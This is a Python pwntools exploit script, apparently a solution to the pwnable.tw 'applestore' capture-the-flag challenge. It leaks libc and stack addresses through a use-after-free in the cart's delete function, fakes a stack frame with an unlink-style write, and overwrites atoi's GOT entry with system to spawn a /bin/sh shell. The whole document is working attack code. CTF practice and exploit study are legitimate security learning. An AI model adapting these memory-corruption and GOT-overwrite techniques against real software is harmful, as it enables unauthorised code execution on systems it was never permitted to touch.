#!/usr/bin/env python3
from pwn import *

# p = remote("chall.pwnable.tw", "10104")

elf = ELF("./vuln")
libc = ELF("./libc.so.6")
context.update(binary=elf, log_level="DEBUG")
p = elf.process()
# gdb.attach(
#     p,
#     """
# 	b *handler+103
# 	b *handler+110
# 	b *handler+117
# 	b *handler+124
# 	b *delete+171
# 	""",
# )


# === Device List ===
# 1: iPhone 6 - $199
# 2: iPhone 6 Plus - $299
# 3: iPad Air 2 - $499
# 4: iPad Mini 3 - $399
# 5: iPod Touch - $199
# iPhone 8 - total: 7174


def listDevice():
    p.sendlineafter(b"> ", b"1")
    return


def add(item):
    p.sendlineafter(b"> ", b"2")
    p.sendlineafter(b"Device Number> ", item)
    return


def delete(item):
    p.sendlineafter(b"> ", b"3")
    p.sendlineafter(b"Item Number> ", item)
    return


def cart():
    p.sendlineafter(b"> ", b"4")
    p.sendlineafter(b"(y/n) >", b"y")
    return


def checkout():
    p.sendlineafter(b"> ", b"5")
    p.sendlineafter(b"(y/n) >", b"y")
    return


myCart = 0x0804B068
dword_804B070 = 0x0804B070

# pass checkout => get iphone 8 allocated in stack
for i in range(6):
    add(b"1")

for i in range(20):
    add(b"2")

# get iphone 8 - 1$
checkout()

# leak libc address
payload = b"27" + p32(elf.got["atoi"]) + p32(0) * 3
delete(payload)
p.recvuntil(b"27:")
atoi = u32(p.recv(4))
libc.address = atoi - libc.symbols["atoi"]
system = libc.symbols["system"]
binsh = next(libc.search(b"/bin/sh"))
log.success("Address function atoi LIBC   : " + hex(libc.symbols["atoi"]))
log.success("Address LIBC base            : " + hex(libc.address))
log.success("Address function system LIBC : " + hex(system))

# leak stack address | p &environ
environ = libc.symbols["environ"]
log.success("Address &**environ           : " + hex(environ))

payload = b"27" + p32(environ) + p32(0) * 3
delete(payload)
p.recvuntil(b"27:")
environ_stack = u32(p.recv(4))
ebp_address = environ_stack - 0x104
log.success("Address environ stack           : " + hex(environ_stack))
log.success("Address EBP of Delete() function: " + hex(ebp_address))

# write ebp to atoi+0x22 use struct PRODUCT fd, bk - fake stack
log.info("===== Used struct PRODUCT: fd, bk and func Delete() => overwrite =====")
payload = b""
payload += b"27" + p32(0) * 2 + p32(ebp_address - 0xC) + p32(elf.got["atoi"] + 0x22)
delete(payload)

# Set the atoi got to system addr, and excute the system('system_addr||/bin/sh')
payload = b""
payload += p32(system) + b"||/bin/sh"
p.sendlineafter(b"> ", payload)

p.interactive()
